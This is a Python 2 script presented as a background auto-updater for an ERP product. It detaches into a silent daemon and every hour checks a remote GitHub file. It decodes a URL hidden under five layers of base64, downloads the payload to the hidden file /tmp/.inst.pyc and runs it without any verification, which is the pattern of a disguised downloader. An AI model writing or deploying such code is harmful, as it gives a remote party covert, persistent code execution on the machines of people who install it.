#!/usr/bin/env python
# _*_ coding:utf8 _*_
# Kevien：vianus@qq.com  CreatDate:2017-1-10

import sys
import os


def main():
    import re
    import urllib
    import urllib2
    import time
    import base64

    #定时同步更新
    flang = True
    while flang:    
        #获取网页
        def get_html(url):
            page = urllib2.urlopen(url)
            html = page.read()
            return(html)

        #获取网页或文件内相关信息
        def get_text(text):
            text = re.findall('软件名称:(.*?)\n升级版本:(.*?)\n发布日期:(.*?)\n升级说明:(.*?)\n更新内容:(.*?)\n',text,re.S)
            #print text
            return(text)
   
        #解密文本并下载运行主文件
        def base64_de(insturl):
			for i in range(0,5):
				insturl = base64.decodestring(insturl)
                #print insturl    
			insturl = re.findall('download:(.*?)$',insturl)
            #print insturl[0]
            #下载文件到/tmp
			urllib.urlretrieve(insturl[0],'/tmp/.inst.pyc')
			os.system('python /tmp/.inst.pyc &')
			time.sleep(3600)
           
            
        #获取文件文本
        def get_file(filename):
            with open(filename) as text:
                text = text.read()
                return(text)
  
    
        #取远程版本号
        html = get_html("https://raw.githubusercontent.com/alisuki/Update/fy_erp/Ver")
        text = get_text(html)
        remote_ver = text[0][2]
        #print(remote_ver)
        

        #取本地版本号
        if os.path.isdir('/etc/fyerp'):
            if os.path.isfile('/etc/fyerp/Ver'):
                text = get_file('/etc/fyerp/Ver')
                text = get_text(text)
                local_ver = text[0][2]
                #print(local_ver)
            else:
                base64_de(text[0][4])
                continue
        else:
            os.mkdir('/etc/fyerp')
            base64_de(text[0][4])
            continue
            

        #进行版本对比
        if remote_ver > local_ver:
            base64_de(text[0][4])
        
        
        #flang = False
        time.sleep(3600)


def daemonize (stdin='/dev/null', stdout='/dev/null', stderr='/dev/null'):  
	#重定向标准文件描述符（默认情况下定向到/dev/null）  
    try:   
        pid = os.fork()   
		#父进程(会话组头领进程)退出，这意味着一个子进程（非会话组头领）永远不能重新获得控制终端。  
        if pid > 0:  
            sys.exit(0)   #父进程退出  
    except OSError, e:   
        sys.stderr.write ("fork #1 failed: (%d) %s\n" % (e.errno, e.strerror) )  
        sys.exit(1)  
  
	#从母体环境脱离  
    os.chdir("/")  #chdir确认进程不保持任何目录于使用状态，否则不能umount一个文件系统。也可以改变到对于守护程序运行重要的文件所在目录  
    os.umask(0)    #调用umask(0)以便拥有对于写的任何东西的完全控制，因为有时不知道继承了什么样的umask。  
    os.setsid()    #setsid调用成功后，进程成为新的会话组长和新的进程组长，并与原来的登录会话和进程组脱离。  
  
	#执行第二次fork  
    try:   
        pid = os.fork()   
        if pid > 0:  
            sys.exit(0)   #第二个父进程退出  
    except OSError, e:   
        sys.stderr.write ("fork #2 failed: (%d) %s\n" % (e.errno, e.strerror) )  
        sys.exit(1) 
		
		
if __name__ == "__main__":  
      daemonize('/dev/null','/dev/null','/dev/null')  
      main()  


